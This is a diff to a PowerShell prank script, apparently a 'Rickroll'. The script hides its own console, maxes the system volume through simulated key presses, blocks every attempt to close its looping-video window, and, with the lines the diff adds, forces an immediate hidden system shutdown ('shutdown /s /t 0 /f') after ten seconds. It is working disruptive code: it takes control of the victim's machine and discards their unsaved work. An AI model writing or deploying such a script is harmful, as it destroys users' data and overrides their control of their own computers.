@@ -13,10 +13,6 @@ public class Win32 {
     public static extern IntPtr SetWindowLong(IntPtr hWnd, int nIndex, IntPtr dwNewLong);
     [DllImport("user32.dll")]
     public static extern IntPtr GetWindowLong(IntPtr hWnd, int nIndex);
-    [DllImport("user32.dll")]
-    public static extern bool RegisterHotKey(IntPtr hWnd, int id, uint fsModifiers, uint vk);
-    [DllImport("user32.dll")]
-    public static extern bool UnregisterHotKey(IntPtr hWnd, int id);
 }
 "@
 
@@ -24,7 +20,7 @@ $SW_HIDE = 0
 $consolePtr = [Win32]::GetConsoleWindow()
 [Win32]::ShowWindow($consolePtr, $SW_HIDE)
 
-# Set system volume to max (fallback to sending volume keys)
+# Set system volume to max (send volume keys)
 function Set-Volume100 {
     $wshell = New-Object -ComObject wscript.shell
     for ($i=0; $i -lt 50; $i++) { $wshell.SendKeys([char]174); Start-Sleep -Milliseconds 10 }  # Volume Down many times
@@ -80,7 +76,6 @@ $form.Controls.Add($pictureBox)
 # Block closing the form by cancelling FormClosing event
 $form.Add_FormClosing({
     param($sender, $e)
-    # Cancel the close event unconditionally
     $e.Cancel = $true
 })
 
@@ -117,6 +112,33 @@ $form.Add_Shown({
     $wmp.settings.setMode("loop", $true)
     $wmp.controls.play()
 })
+
+# Timer to wait 10 seconds, then overlay message and shutdown
+$timer = New-Object System.Windows.Forms.Timer
+$timer.Interval = 10000  # 10 seconds
+$timer.Add_Tick({
+    $timer.Stop()
+
+    # Create label overlay on top of GIF
+    $label = New-Object System.Windows.Forms.Label
+    $label.Text = "Rick say no"
+    $label.ForeColor = [System.Drawing.Color]::Red
+    $label.BackColor = [System.Drawing.Color]::FromArgb(180,0,0,0)  # semi-transparent black
+    $label.Font = New-Object System.Drawing.Font("Arial", 72, [System.Drawing.FontStyle]::Bold)
+    $label.AutoSize = $false
+    $label.Dock = "Fill"
+    $label.TextAlign = 'MiddleCenter'
+
+    # Add label on top without removing GIF
+    $form.Controls.Add($label)
+    $label.BringToFront()
+
+    $form.Refresh()
+
+    # Shutdown immediately
+    Start-Process -FilePath "shutdown" -ArgumentList "/s /t 0 /f" -WindowStyle Hidden
+})
+$timer.Start()
 
 # Show the form (blocks here)
 $form.ShowDialog()
